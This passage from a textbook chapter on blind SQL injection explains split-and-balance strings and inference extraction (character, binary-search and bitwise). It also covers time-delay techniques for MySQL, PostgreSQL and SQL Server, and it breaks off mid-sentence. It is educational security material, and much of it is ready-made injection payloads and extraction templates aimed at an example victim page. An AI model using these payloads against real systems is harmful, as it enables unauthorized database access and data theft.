placed into a sql query to produce: select count(id) from reviews where review_author=‘madbob’ it is possible to split the string madbob with database- specific operators that provide different inputs to the application that correspond to madbob. an oracle exploit using the || operator to concatenate two strings is: madb‘||’ob this yields the sql query: select count(id) from reviews where review_author=‘madb’||‘ob’ which is functionally equivalent to the first query. finally, litchfield also pointed out that the technique could be used to create exploit strings that are virtually context -free. by using the splitting and balancing technique in combination with subqueries it is possible to form exploits that are usable in many scenarios without modification. the following mysql queries will produce the same output: select review_content, review_author from reviews where id=5 select review_content, review_author from reviews where id=10— 5 select review_content, review_author from reviews where id=5+(select 0/1) in the final sql statement above, a subquery was inserted. since any subquery could be inserted at this point, the splitting and balancing technique provides a neat wrapper for injecting more complex queries that actually extract data. however, mysql does not allow us to split and balance string parameters (since it lacks a binary string concatenation operator), restricting the technique to numeric paramet ers only. microsoft sql server, on the other hand, does permit the splitting and balancing of string parameters as the following equivalent queries show: select count(id) from reviews where review_author=‘madbob’ select count(id) from reviews where review_author=‘mad’+char(0x42)+‘ob’ select count(id) from reviews where review_author=‘mad’+select(‘b’)+‘ob’ select count(id) from reviews where review_author=‘mad’+(select(‘b’))+‘ob’ select count(id) from reviews where review_author=‘mad’+(select ’’ )+‘bob’ the l ast statement above contains a superfluous subquery in bold that could be replaced with a more meaningful exploit string, as we shall shortly see. a clear advantage of the split and balance approach is that even if the exploit string is inserted into a stored procedure call, it will still be effective. table 5.1 provides a number of split and balanced strings that contain a subquery placeholder (<subquery>) for mysql, postgresql, microsoft sql server, and oracle. the production of the strings is given in simplified bnf (backus -naur form) grammar. warning logical operators, although usable, are not suitable for numeric parameters as they depend on the value of <number>. table 5.1 split and balanced strings with subquery placeholders mysq l injection_string :: = type_expr type_expr ::= string_expr | number_expr | date_expr string_expr ::= (see below) number_expr ::= number number_op (<subquery>) date_expr ::= date ’ date_op (<subquery>) number_op ::= + | – | ∗ | / | & | “|” | ^ | xor date_op ::= + | – | “||” | “|” | ^ | xor it is not possible to split and balance string parameters without side -effects. subqueries can be easily executed but this would change the result of the query. if the mysql database was started in ansi mode, then the || operator is available for string concatenation in subqueries: string_expr ::= string’ || (<subquery>) || ’ mysq l postgresql injection_string :: = type_expr type_expr ::= string_expr | number_expr | date_expr string_expr ::= string’ || (<subquery>) || ’ number_expr ::= number number_op (<subquery>) date_expr ::= date ’ || (<subquery>) || ’ number_op ::= + | – | ∗ | / | ^ |% | & | # | “ |” sql server injection_string :: = type_expr type_expr ::= string_expr | number_expr | date_expr string_expr ::= string’ + (<subquery>) + ’ number_expr ::= number number_op (<subquery>) date_expr ::= date ’ + (<subquery>) + ’ number_op ::= + | – | ∗ | / | & | “|” | ^ mysq l oracle injection_string :: = type_expr type_expr ::= string_expr | number_expr | date_expr string_expr ::= string’ || (<subquery>) || ’ number_expr ::= number number_op (<subquery>) date_expr ::= date ’ || (<subquery>) || ’ number_op ::= + | – | ∗ | / | “||” common blind sql injection scenarios here are three common scenarios in which blind sql injection is useful: 1. when submitting an exploit that renders the sql query invalid a generic error page is returned, while submitting correct sql returns a page whose content is controllable to some degree. this is commonly seen in pages where information is displayed based on the user’s selection; for example clicking through to a product description, or viewing the results of a search. in both cases, the user can control the output provided by the page in the sense that the page is built on user -supplied information, and contains data retrieved in response to, say, a provided product id . since the page provides feedback (albeit not in the verbose database error message format) it is possible to use either a time -based confirmation exploit or an exploit that modifies the dataset displayed by the page. for instance, an attack might display the product desc ription of either soap or brushes, to indicate whether a 0 -bit or a 1- bit is being extracted. oftentimes simply submitting a single quote is enough to unbalance the sql query and force the generic error page, which helps in inferring the presence of a sql injection vulnerability. 2. a generic error page is returned when submitting an exploit that renders the sql query invalid, while submitting correct sql returns a page whose content is not controllable . you might encounter this on pages with multiple sql queries but only the first query is vulnerable and it does not produce output. a second common instance of this scenario is sql injection in update or insert statements, where submitted information is written into the database and does not produce output, but could produce generic errors. using a single quote to generate the generic error page might reveal pages that fall into this category, as will time -based exploits, but content -based attacks are not successful. 3. submitting broken or correct sql does not produce an error page or influence the output of the page in any way. since errors are not returned in this category of blind sql injection scenarios, time -based exploits or exploits that produce out -of-band side -effects are the most successful at identi fying vulnerable parameters. blind sql injection techniques having looked at the definition of blind sql injection as well as how to find this class of vulnerabilities, it is time to delve into the techniques by which these vulnerabilities are exploited. t he techniques are split into two categories: inference techniques and alternative or out-of-band channel techniques. inference attacks use sql to ask questions about the database and slowly extract information one bit at a time, while out- of-band attacks u se mechanisms to directly extract large chunks of information through an available out -of-band channel. choosing which technique is best for a particular vulnerability is dependent on the behavior of the vulnerable resource. in trying to decide which appro ach to follow, one should ask whether the resource returns a generic error page on submission of broken sql snippets, and whether the resource allows us to control the output of the page to some degree. inference techniques at their core, all the inference techniques have the ability to extract at least one bit of information by observing the response to a specific query. observation is key, as the response will have a particular signature when the bit in question is 1, and a different response when the bit is 0. the actual difference in response is dependent on the inference device we choose to use, but the chosen means are almost always based on response time, page content or page errors, or a combination of these. in general, inference techniques allow us to inject a conditional branch into a sql statement, offering two paths where the branch condition is rooted in the status of the bit we are interested in. in other words, we insert a pseudo if statement into the sql query: if x then y else z. typically x (converted into the appropriate sql) says something along the lines of “is the value of bit 2 of byte 1 of some cell equal to 1?” and y and z are two separate branches whose behavior is sufficiently different that the attacker can infer which branch was taken. after the inference exploit is submitted the attacker observes which response was returned, y or z. if the y branch was followed then the attacker knows that the value of the bit was 1, otherwise the bit was 0. the sam e request is then repeated except that the next bit under examination is shifted one over. keep in mind that the conditional branch does not have to be an explicit conditional syntax element such as an if statement. although it is possible to use a “proper ” conditional statement, this will generally increase the complexity and length of the exploit; often we can get equivalent results with simpler sql that emulates a formal if statement. the bit of extracted information is not necessarily a bit of data stor ed in the database (although that is the common usage); we can also ask questions such as “are we connecting to the database as the administrator?” or “is this a sql server 2008 database?” or “is the value of a given byte above 127?” here the bit of inform ation that is extracted is not from a database record, rather it is configuration information or information about data in the database, or metadata. however asking these questions still relies on the fact that we can supply a conditional branch into the e xploit so that the answer to the question is either true or false. thus, the inference question is a sql snippet that returns true or false based on a condition supplied by the attacker. let us distill this into a concrete example using a simple technique. we shall focus on an example page count_chickens.aspx which is used to track the well -being of chicken eggs on an egg farm. each egg has an entry in the chickens table and among various columns is the status column that takes the value incubating for unha tched eggs. a count is displayed when browsing to the url: http://www.victim.com/count_chickens.aspx?status=incubating in this example, the status parameter is vulnerable to blind sql injection. when requested, the page queries the database with the following select statement: select count(chick_id) from chickens where status=‘incubating’ what we would like to accomplish is the extraction of the username that the page uses to connect to the databa se. in our microsoft sql server database there is a function system_user that will return the login username in whose context the database session has been established. normally we could view this with the sql “select system_user” but in this case the resu lts are not visible. figure 5.1 depicts an attempt to extract data using the verbose error message technique but the page returns a standard error page. unfortunately the developers followed bad security advice and ra ther than steering clear of dynamic sql chose instead to catch database exceptions and display a generic error message. figure 5.1 unsuccessful attempt to extract data through error messages when we submit status=incubating the page executes the above sql query and returns the string shown in figure 5.2. figure 5.2 response when counting unhatched eggs we can alter the status parameter such that the sql query returns an empty result set by adding the ‘always false’ clause and ‘1’=‘2 to the legitimate query, yielding the sql statement: select count(chick_id) from chickens where status=‘incubating’ and ‘1’=‘2’ the response to thi s query is shown in figure 5.3 and from the message we can infer that the query returned an empty result set. keep in mind that for two rows status was incubating but the trailing false clause ensured that no rows would match. figure 5.3 forcing an empty result set this is a classic example of blind sql injection as no ver bose database errors are returned but we can still inject sql into the query and we can alter the results returned to us (we either get an egg count or we get “no eggs have that status”). instead of inserting an always false clause, we can insert a clause that is sometimes true and sometimes false. since we are trying to derive the database username, we can ask whether the first character of the login is ‘a’ by submitting status=incubating’ and substring(system_user,1,1)=’a which generates the sql statement : select count(chick_id) from chickens where status=‘incubating’ and substring(system_user,1,1)=‘a’ this sql snippet will extract the first character from the output of system_user using the substring() function. apart from the string, the two parameters t o substring are the starting position, and the length of the string to extract. if the first character is indeed ‘a’, then the second clause is true and we would see the positive result from figure 5.2, otherwise if t he character is not ‘a’ then the second clause is false and an empty result set would be returned which would yield the message shown in figure 5.3. assuming the first character was not ‘a’, we then submit a second pa ge query with our custom status parameter asking whether the first character is ‘b’ and so forth until the first character is found: incubating’ and substring(system_user,1,1)=’a (false) incubating’ and substring(system_user,1,1)=’b (false) incubating’ and substring(system_user,1,1)=’c (false) incubating’ and substring(system_user,1,1)=’s (true) the “false” and “true” conditions are states that are inferred by the content on the page after each request is subm itted and do not refer to content within the page, i.e. if the response contains “no eggs...” then the state was false otherwise the state was true. an important consideration is to decide on the alphabet that is used to search for characters. if the data being extracted is text, then an alphabet in the language of the application’s userbase is obvious. in addition, numbers and punctuation must also be considered and, if the data is binary, non- printable or high characters too should be included. we now shift our attention to the second character and repeat the process starting at ‘a’ and moving through the alphabet. as each successive character is found, the search moves onto the next character. the page queries that reveal the username on our sample page are: incubating’ and substring(system_user,1,1)=’s (true) incubating’ and substring(system_user,2,1)=’q (true) incubating’ and substring(system_user,3,1)=’l (true) incubating’ and substring(system_user,4,1)=’0 (true) incubating’ and substring(system_user,8,1) =’8 (true) easy, isn’t it? the username is ‘sql08’. unfortunately all is not as simple as one would like and we have skipped over a pretty important question. how do we know when the end of the username has been reached? if the portion of username discover ed so far is ‘sql08’, how can we be sure that there is not a sixth, seventh or eighth character? the substring() function will not generate an error if we ask it to provide characters past the end of the string, instead it returns the empty string ‘’. ther efore we can include the empty string in our search alphabet and if it is found then we can conclude the end of the username has been found: status=incubating’ and substring(system_user,6,1)=’ (true) that appears to solve the problem, except it is not very portable and depends on the explicit behavior of a particular database function. a neater solution would be to first determine the length of the username before extracting it. the advantage of this approach, apart from being applicable to a wider range of scenarios than the “substring() returns empty string” approach, is that it enables the attacker to estimate the maximum time that could possibly be spent in extracting the username. we can find the length of the username with the same technique we employe d to find each character, by testing whether the value is 1, 2, 3, and so on until we find a match: status=incubating’ and len(system_user)=1-- (false) status=incubating’ and len(system_user)=2-- (false) status=incubating’ and len(system_user)=3-- (false) status=incubating’ and len(system_user)=4-- (false) status=incubating’ and len(system_user)=5-- (true) from this sequence of requests it was possibly to infer that the length of the username was 5. note as well the use of the sql comment ( --) that, althoug h not required, makes the exploit a little simpler. it is worth reinforcing the point that the inference tool used to determine whether a given question was true or false was the presence in a webpage of either an egg count message or a message stating that no eggs matched the given status. this demonstrates that the mechanism for making an inference decision is highly dependent on the scenario and can often be substituted with a number of differing techniques. are you owned? counting eggs and requests if it is not already clear, the inference techniques described in this chapter are noisy and resource intensive; extracting one bit per request means that an attacker will have to send thousands of requests at a minimum, running into millions where megabytes o f data are retrieved. this helps in spotting such attacks using basic metrics: requests per minute, database queries per minute, tracking database connection pool errors, and bandwidth utilization are all possible data points that can be monitored to evalu ate whether an inference attack is ongoing. for large sites many of these metrics could well fall under the radar as the attack may not sufficiently spike the numbers; it may also help to track requests per page as the inference attack will in all likelihood use a single injection point to complete the attack. increasing the complexity of inference techniques it may have occurred to you that testing each character in the username against the entire alphabet (plus digits and possibly non -alphanumeric characters) is a pretty inefficient method for extracting data. to retrieve the username we had to request the pa ge 115 times (5 for the length and 19, 17, 12, 27, and 35 for the characters ‘s’, ‘q’, ‘l’, ‘0’, and ‘8’, respectively). a further consequence of this approach is that when retrieving binary data we could potentially have an alphabet of 256 characters, whi ch sharply increases the number of requests and in any case is often not binary -safe. there are two methods that are used to improve the efficiency of retrieval through inference, a bit -by-bit method and a binary search method, and both methods are binary -safe. the binary search method (also referred to in some places as the bisection algorithm) is mostly used to infer the value of single bytes without having to search through an entire alphabet. it successively halves the search space until the value of th e byte is identified, by playing a game of eight questions. since an 8- bit byte can have 1 of 256 values, the value will always be determined in eight requests. this is intuitively demonstrated by counting the number of times one can successively divide 256 in 2 before a non- integer quotient is found. assume the byte of interest has the value 14. we ask questions and infer the answer through a convenient inference mechanism, which will return “yes” if the answer is true and “no” if the answer is false. the game then proceeds like this: 1. is the byte greater than 127? no, because 14 < 127. 2. is the byte greater than 63? no, because 14 < 63. 3. is the byte greater than 31? no, because 14 < 31. 4. is the byte greater than 15? no, because 14 < 15. 5. is the by te greater than 7? yes, because 14 > 7. 6. is the byte greater than 11? yes, because 14 > 11. 7. is the byte greater than 13? yes, because 14 > 13. 8. is the byte greater than 14? no, because 14 = 14. since the byte is greater than 13 but not greater than 14, we can infer that the byte has the value 14. this technique relies on a database function to provide the integer value of any byte; under microsoft sql server this is provided by the ascii() function and likewise in mysql, postgresql, and oracle. if we return to the original problem of finding the database username, but now use the binary search technique to find the first character of the username then we would like to execute the sql statement: select count(chick_id) from chickens where status=‘incubating’ and ascii(substring(system_user,1,1))>127-- ’ we need to issue eight sql statements in order to absolutely determine the character’s value; converting all these queries into page requests produces: incubating’ and ascii(substring(system_user,1,1))>127-- (false) incubating’ and ascii(substring(system_user,1,1))>63-- (true) incubating’ and ascii(substring(system_user,1,1))>95-- (true) incubating’ and ascii(substring(system_user,1,1))>111-- (true) incubating’ and ascii(substring(system_user,1,1))>119-- (false) incubating’ and ascii(substring(system_user,1,1))>115-- (false) incubating’ and ascii(substring(system_user,1,1))>113-- (true) incubating’ and ascii(substring(system_user,1,1))>114-- (true) from this series of requests we can infer that the byte value of the first character of the username is 115 which, when converted to it’s ascii table equivalent is ‘s’. using this technique it is possible to extract a byte in exactly eight requests which is a vast improvement on comparing the full byte against an alphabet. regardless of the value being extracted, if only two states can be observed then extraction will always take eight requests. try for yourself with randomly chosen byte values. if we add a third state to the request (error) then it is possible to test for equality in our binary search thereby reducing the best -case number of requests to one request with eight requests being a worst case. interestingly, this will only reduce the expected num ber of requests to about 7.035 for uniformly distributed data. an example of this is provided later. this is great. we have a method by which it is possible to efficiently extract the value of a given byte in a fixed time in as many requests as there are b its using a two -state channel. unless we use compression or an injection string that handles more than two states this as good as it gets from an information theory perspective. however there is still a performance issue with the binary search technique si nce each request is dependent on the result of the previous request; we cannot make the second request before the answer to the first is known since our second request might be to test the byte against 63 or 191. thus requests for a single byte cannot be r un in parallel and this violates our good sense . note while it is true that bytes could be requested in parallel, there is no good reason to stop there without attempting to parallelize bit requests. we look into this further below. this non- parallel requi rement is not an inherent limitation of inference techniques in general, just the binary search approach. extracted data remain constant in the database, in the sense that we are not changing them. of course any application accessing the data could make alterations; if that is the case then all bets are off and all inference techniques become unreliable . optimizing the binary search a little cheating is allowed it is not entirely true that characters always take eight requests to extract when two states are available. when the content being extracted is known to be text then some optimizations are possible, especially where the character set and collation are known. instead of using all eight bits, we essentially make assumptions about where the text charact ers reside in the set of all possible byte values and rely on string comparisons to implement the binary search method. this approach requires that the characters being extracted have an alphabet that is ordered and supports character comparison. for examp le, if the data consists only of a case- sensitive roman alphabet with decimal digits, then 62 possible characters exist. the binary search for the first character of the username across the alphabet “0...9a...za...z” proceeds as follows: incubating’ and substring(system_user,1,1)>‘u’ -- (true) incubating’ and substring(system_user,1,1)>‘j’ -- (true) incubating’ and substring(system_user,1,1)>‘s’ -- (false) incubating’ and substring(system_user,1,1)>‘o’ -- (true) incubating’ and substring(system_user,1,1)>‘q’ -- (true) incubating’ and substring(system_user,1,1)>‘r’ -- (true) character is thus ‘s’ of course, we’ve ignored punctuation in the alphabet queried above, but it permits extraction in at most six requests. in some cases, the alphabet is predictable but does not ov erlap with an alphabet recognized by the database. for example, if extracting md5 hashes, the possible alphabet is only 16 characters. one can simulate alphabets with sql’s set construct and build the alphabets yourself. in the following example, the first character from an md5 hash is extracted: incubating’ and substring(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘0’,‘1’,‘2’,‘3’,‘4’,‘5’,‘6’,‘7’); incubating’ and substring(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘8’,‘9’,‘a’,‘b’,‘c’,‘d’,‘e’,‘f’) incubating’ and substring(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘8’,‘9’,‘a’,‘b’) incubating’ and substring(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘e’,‘f’) incubating’ and substring(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘d’) character is th us ‘c’ in mysql, it is possible to specify both the character set and the collation in a query. below, we force two chinese characters to be interpreted and ordered as latin characters: select _latin1 ‘ ’< _latin1 ‘ ’ collate latin1_bin; forcing multi -byte character sets like this is not recommended however, as it is heavily dependent on the murky world of conversion and collation rules. the binary search technique grouped 8- bits into a byte and inferred the value of all 8 -bits through eight requests. instead, let us attempt to infer the value of a single chosen bit per request (say, the second bit of the byte.) if successful, then we could issue eight parallel requests for all bits in a byte and retrieve its value in less time than the binary search method would take to retrieve the same byte since requests would be made side- by-side rather than one after the other. massaging bits requires sufficiently helpful mechanisms within the sql variant supported by the database under attack and table 5.2 lists the bit functions supported by mysql, postgresql, sql server, and oracle on two integers i and j. since oracle does not provide an easily accessible native or and xor function we can roll our own. table 5.2 bitwise operations in four databases let’s look at a few t -sql predicates that ret urn true when the username’s first character has a 1-bit set at position two otherwise they return false. a byte that has just the second most significant bit set corresponds to hexadecimal 40 16 and decimal value 64 10, which is used in the predicates below : ascii(substring(system_user,1,1)) & 64 = 64 ascii(substring(system_user,1,1)) & 64 > 0 ascii(substring(system_user,1,1)) | 64 > \\ ascii(substring(system_user,1,1)) ascii(substring(system_user,1,1)) ^ 64 < \\ ascii(substring(system_user,1,1)) each of the predicates is equivalent although they obviously have slightly different syntax. the first two use bitwise and and are useful since they only reference the first character once which shortens the injection string. a further advantage is that sometimes the query that produces the character could be time inefficient or have side -effects on the database and we may not want to run it twice. the third and forth predicates use or and xor, respectively, but require the byte to be retrieved twice, on both sides of the operator. their only advantage is in situations where the ampersand character is not allowed due to restrictions placed in the vulnerable application or defensive layers protecting the application. we now have a method by which we can ask t he database whether a bit in a given byte is 1 or 0; if the predicate returns true then the bit is 1 otherwise the bit is 0. returning to the chicken counting example, the sql that will be executed to extract the first bit of the first byte is: select count(chick_id) from chickens where status=‘incubating’ and ascii(substring(system_user,1,1)) & 128=128--’ sql to return the second bit is: select count(chick_id) from chickens where status=‘incubating’ and ascii(substring(system_user,1,1)) & 64=64-- ’ sql to return the third bit is: select count(chick_id) from chickens where status=‘incubating’ and ascii(substring(system_user,1,1)) & 32=32-- ’ and so on until all eight bits have been recovered. converted into eight individual requests made to the chicken counting page we have these values for the status parameter along with the response when making the request: incubating’ and ascii(substring(system_user,1,1)) & 128=128-- (false) incubating’ and ascii(substring(system_user,1,1)) & 64=64-- (true) incubating’ and ascii(substring(system_user,1,1)) & 32=32-- (true) incubating’ and ascii(substring(system_user,1,1)) & 16=16-- (true) incubating’ and ascii(substring(system_user,1,1)) & 8=8-- (false) incubating’ and ascii(substring(system_user,1,1)) & 4=4-- (false) incubating’ and ascii(substring(system_user,1,1)) & 2=2-- (true) incubating’ and ascii(substring(system_user,1,1)) & 1=1-- (true) since “true” represents 1 and “false” represents 0 we have the bit string 01110011 which is 115 10. looking up 115 10 on an as cii chart give us ‘s’ which is the first character of the username. our focus then shifts to the next byte and the next after that until all bytes have been retrieved. when compared to the binary search method this bit -by-bit approach also requires eight r equests so you may wonder what is the point of all this bit manipulation, however since each request is independent of all others so they can be trivially parallelized. eight requests appear to be quite inefficient in retrieving a single byte, but when the only available option is blind sql injection then this is a small price to pay. it goes without saying that while many sql injection attacks can be implemented by hand, issuing eight custom requests to extract a single byte would leave most people reachin g for the painkillers. since all that differs between requests for different bits are a bunch of offsets, this task is eminently automatable and later in this chapter we will examine a number of tools that take the pain out of crafting these inference attacks. tip if you are ever in a situation where you need to have an integer value broken up into a bit string using sql, then sql server 2000, 2005, and 2008 support a user -defined function fn_replinttobitstring(), which takes as its sole argument an integer and returns a 32 -character string representing the bit string. for example, fn_replinttobitstring(ascii(‘s’)) returns ‘00000000000000000000000001110011’, which is a 32- bit representation of 115 10, or ‘s’. alternative channel techniques the second category of methods for extracting data in blind sql injection vulnerabilities is by means of alternative channels. what sets these methods apart from the inference techniques is that while inference techniques rely on the response sent by the vulnerable page, alt ernative channel techniques utilize transports apart from the page response. this includes channels such as dns, email, and http requests. a further attribute of alternative channel techniques is that generally they enable us to retrieve chunks of data at a time rather than infer the value of individual bits or bytes, which make alternative channels a very attractive option to explore. instead of using eight requests to retrieve a single byte, we could possibly retrieve 200 bytes with a single request. howe ver, most alternative channel techniques require larger exploit strings than inference techniques. using time -based techniques now that we have covered a little background theory on both classes of techniques it is time to dig into the actual exploits. whe n covering the various methods for inferring data there was an explicit assumption that an inference mechanism existed that enabled us to either use a binary search method or a bit -by-bit method to retrieve the value of a byte. in this section a time based mechanism that is usable with both inference methods is discussed and dissected. you will recall that for the inference methods to work, all that is required is that we can differentiate between two states based on some attribute of the page response. one attribute that every response has is the time difference between when the request was made and when the response arrived. if we could pause a response for a few seconds when a particular state was true but not when the state was false, then we would have a signaling trick that would suit both inference methods. we will concentrate on two states: delayed or not. it is true that where timing is used then in fact every tick of a clock represents a possible state to confer information; by pausing for one, three or a million ticks, many states can be communicated. for example, ferruh mavituna showed a technique by which a byte was split into two 4- bit nibbles and execution paused for that number of seconds. to retrieve the byte 0xa3, a request is made for each nibble where the first nibble delays for 10 s and the second nibble pauses for 3 s. however, unreliable connections prevent exploitation with clock resolutions in the sub- second range as noise masks the signal. additionally, these types of approaches do not reduce the total average running time, though they do reduce the total number of requests needed. delaying database queries since introducing delays in queries is not a standardized capability of sql databases, each database has its own trick to introduce delays and we cover mysql, postgresql, sql server, and oracle. mysql delays mysql has two possible methods of introducing de lays into queries, depending on the mysql version. if the version is 5.0.12 or newer then a sleep() function is present which will pause the query for a fixed number of seconds (and microseconds if needed). figure 5.4 shows a query that executed sleep(4.17) and took exactly 4.17 s to run as the result line shows. figure 5.4 executing mysql sleep() for versions of mysql that do not have a sleep() function it is possible to duplicate the behavior of sleep() using the benchmark() function which has the prototype benchmark( n, expression ) where expression is some sql expression and n is the number of times that the expression should be repeatedly executed. the primary difference between benchmark() and sleep() is that benchmark introduces a variable but noticeable delay into the query, while sleep() forces a fixed delay. if the database is running under a heavy load then benchmark() will run slower but since the noticeable delay is accentuated rather than diminished the usefulness of benchmark() in inference attacks remains. since expressions are executed very quickly they need to be run many times before we start to see delays in the query and n could take on values of 1,000,000,000 or higher if the expression is not computationally intensive, in order to lower the influence that line jitter has on the request. the expression must be scalar, so functions that return s ingle values are useful as are subqueries that return scalars. provided below are a number of examples of the benchmark() function along with the time each took to execute on the author’s mysql installation: select benchmark(1000000,sha1(current_user)) (3. 01 seconds) select benchmark(100000000,(select 1)) (0.93 seconds) select benchmark(100000000,rand()) (4.69 seconds) this is all very neat, but how can we implement an inference -based blind sql injection attack using delayed queries in mysql? a demonstratio n might by suitable at this point so let us introduce the simple example application that is used from this point (the chickens have hatched, no more eggs are left to count so the previous application is unneeded). it has a table called reviews that stores movie review data and the columns are id , review_author , and review_content . when accessing the page count_reviews.php?review_author=madbob then the following sql query is run: select count(∗ ) from reviews where review_author=‘ madbob’ possibly the simples t inference we can make is whether we are running as the root user. two methods are possible, one using sleep() and the other benchmark(): select count(∗ ) from reviews where review_author=‘ madbob’ union select if(substring(user(),1,4)=‘ root’,sleep(5),1) select count(∗ ) from reviews where review_author=‘ madbob’ union select if(substring(user(),1,4)=‘ root’,benchmark(100000000,rand()),1) converting these into page requests they become: count_reviews.php?review_author=madbob’ union select if(substring(user(),1,4)=0x726f6f74,sleep(5),1)# count_reviews.php?review_author=madbob’ union select if(substring(user(),1,4)=0x726f6f74,benchmark(100000000,rand()),1)# (note the replacement of ‘root’ with the string 0x726f6f74 which is a common evasion technique as it allows us to specify strings without using quotes, and the presence of the ‘#’ symbol at the end of each request to comment out any trailing characters.) you may recall that one can either infer data through a binary search approach or a bit -bybit approach. sinc e the underlying techniques and theory has already been dealt with in depth, we merely provide exploit strings for both in the next two subsections. generic mysql binary search inference exploits string injection points (will require massaging to get the n umber of columns in the union select to match that of the first query): ‘ union select if(ascii(substring((...), i,1))>k,sleep(1),1)# ‘ union select if(ascii(substring((...), i, 1))>k,benchmark(100000000, rand()),1)# numeric injection points: + if(ascii(substring((...),i ,1))>k,sleep(5),1)# + if(ascii(substring((...),i , 1))>k,benchmark(100000000, rand()),1)# where i is the i th byte returned by the subquery (...) and k is the current middle value of the binary search. if the inference question returns true then the response is delayed. generic mysql bit -by-bit inference exploits string injection points using the bitwise and, which can be substituted for other bit operations (these exploits will require massaging when used to match the number of columns in the union select to that of the first query): ‘ union select if(ascii(substring((...), i,1))&2j=2j,sleep(1),1)# ‘ union select if(ascii(substring((...), i,1))&2j=2j,benchmark(100000000,rand()),1)# numeric injection points: + if(ascii(substring((...),i ,1))&2j=2j,sleep(1),1)# + if(ascii(substring((...),i ,1))2j=2j,benchmark(100000000, rand()),1)# + if(ascii(substring((...),i ,1))|2j>ascii(substring((...),i ,1)),sleep(1),1# + if(ascii(substring((...),i ,1))|2j>ascii(substring((...),i ,1)),benchmark(100000000, rand()),1)# + if(ascii(substring((...),i ,1))^2j<ascii(substring((...),i ,1)),sleep(1),1# + if(ascii(substring((...),i ,1))^2j<ascii(substring((...),i ,1)),benchmark(100000000, rand()),1)# where i is the i th byte returned by the subquery (...) and j is the bit we are interested in (bit 1 is the least significant and bit 8 is the most significant). so if we want to retrieve bit 3 then 2j = 23 = 8 and for bit 5, 2j = 25 = 32. tip as always with sql injection, asking which part of the legitimate query is influenced by the attacker is an important step in understanding the effect of each exploit. for example, the timing -based inference attacks on mysql almost always introduce a delay in the where clause of query. however since the where clause is evaluated against each row, any delay is multiplied by the number of rows that the clause is compared against. for example, using the exploit snippet “ + if(ascii(substring((...), i,1))>k,sleep(5),1) ” on a table of 100 rows produces a delay of 500 s. at first glance th is may seem contrary to what we would like, but it does allow us to estimate the size of tables; moreover since sleep() can pause for microseconds we can still have the overall delay for the query take just a few seconds even if the table has thousands or millions of rows. postgresql delays postgresql also has two possible methods of introducing delays into queries, depending on the version. if the version is 8.1 or older, then one can create a function in sql that is bound to the system library’s sleep() f unction. however, in versions 8.2 and newer, this is not possible as extension libraries need to define magic constants, which your system library is unlikely to have. instead, postgresql provides a pg_sleep() function as part of a default install, and is our starting point. this function will pause execution for the given number of seconds (fractional components are permitted too). however, pg_sleep() has a void return type which introduces additional complexity, since it cannot be used in the typical wher e clause. while many postgresql drivers support stacked queries in a similar fashion to sql server, the results of the second query (containing pg_sleep()’s void return value) would be processed by the handling application, causing an error. for example, w hile the following query will pause execution for a second, the handling application could fail in dealing with an unexpected result set: select ∗ from reviews where review_author=‘ madbob’; select case 1 when 1 then pg_sleep(1) end; one solution in this case is to simply add on a third dummy query that returns the right number of columns: select ∗ from reviews where review_author=‘ madbob’; select case 1 when 1 then pg_sleep(1) end; select null,null,null; however this is not nearly so neat as the split and balanced approach. if the database connection is made by the database owner or the connecting user has permission to create pl/pgsql functions, then a pg_sleep() wrapper can be constructed that returns a value, and is therefore usable in split and balanced exploits. postgresql supports defining blocks of sql using a procedural language called pl/pgsql, and permissions to create functions are assigned even to non- superuser accounts. however, the database owner must enable the language p er database. if the connecting user is the database owner, then this query will enable pl/pgsql: create language ‘plpgsql’; once enabled (or if it was already present), the next step is to define the wrapper function pause() which takes one argument, the d elay: create or replace function pause(integer) returns integer as $$ declare wait alias for $1; begin perform pg_sleep(wait); return 1; end; $$ language ‘plpgsql’ strict; newlines in the function definition are irrelevant and the whole definition can be placed on a single line, making the exploitation string quite usable. lastly, with the new function in place, it is now possible to call it directly in a query: select count(∗ ) from reviews where id=1+(select case (expression) when (condition ) then pause(5) else 1 end) an exploit string to test whether the connecting user is a superuser is: count_reviews.php?id=1+(select case (select usename from pg_user where usesuper is true and current_user=usename) when (user) then pause(5) else 1 end) what follows are exploit strings for both binary search and bit -by-bit exploits. generic postgresql binary search inference exploits string injection points with a stacked query and a user -defined pause() function: ’; select case when (ascii(substr(...,i ,1)) > k) then pg_sleep(1) end; select null,...,null;-- ’||(select case when (ascii(substr(...,i ,1)) > k ) then pause(1) else 1 end);-- numeric injection points with a stacked query and a user -defined pause() function: 0; select case when (ascii(substr(...,i ,1)) > k) then pg_sleep(1) end; select null,...,null;-- + (select case when (ascii(substr(...,i ,1)) > k) then pause(1) else 1 end);-- where i is the i th byte returned by the subquery (...) and k is the current middle value of the binary search. if the inference question returns true then the response is delayed. generic postgresql bit -by-bit inference exploits string injection points using the bitwise and, which can be substituted for other bit: ’; select case when (ascii(substr(...,i ,1))&2j=2j) then pg_sleep(1) end; select null,...,null; ’||(select case when (ascii(substr(...,i ,1))&2j=2j) then pause(1) else 1 end);-- numeric injection points: 0; select case when (ascii(substr(...,i ,1)&2j=2j) then pg_sleep(1) end; select null,...,null;-- + (select case when (ascii(substr(...,i ,1)&2j=2j) then pause(1) else 1 end);-- where i is the i th byte returned by the subquery (...) and j is the bit we are interested in (bit 1 is the least significant and bit 8 is the most sig nificant). sql server delays sql server provides an explicit facility for pausing the execution of any query. using the waitfor keyword it is possible to cause a sql server to halt execution of a query until some time period has passed, which can either be relative to the time at which the keyword was encountered or an absolute time when execution should resume (such as midnight). mostly we use the relative option, which makes use of the delay keyword. thus, to pause execution for 1 min and 53 s one would use waitfor delay ‘00:01:53’ . the result is a query that indeed executes for 1 min and 53 s as figure 5.5 shows —the time the query took to execute is shown in the status bar along the bottom of the window. note that this does not impose a maximum bound on the execution time; we are not telling the database to only execute for 1:53, rather we are adding 1:53 to whate ver be the query’s normal execution time so the delay is minimum bound. notes from the underground simulating benchmark() on microsoft sql server and other databases in mid -2007 chema alonso published a technique for duplicating mysql’s benchmark() effect of prolonging queries through extra processing load “heavy queries” in sql server and this provided another mechanism for inferring data without the need for an explicit sleep() -type function. his technique used two subqueries separated by a logical and wh ere one of the queries would take a number of seconds to run and the other subquery contained an inference check. if the check failed (bit x was zero) then the second subquery would return and the first subquery would be prematurely aborted due to the pres ence of the and clause. the net effect was if the bit being inferred was 1, then the request 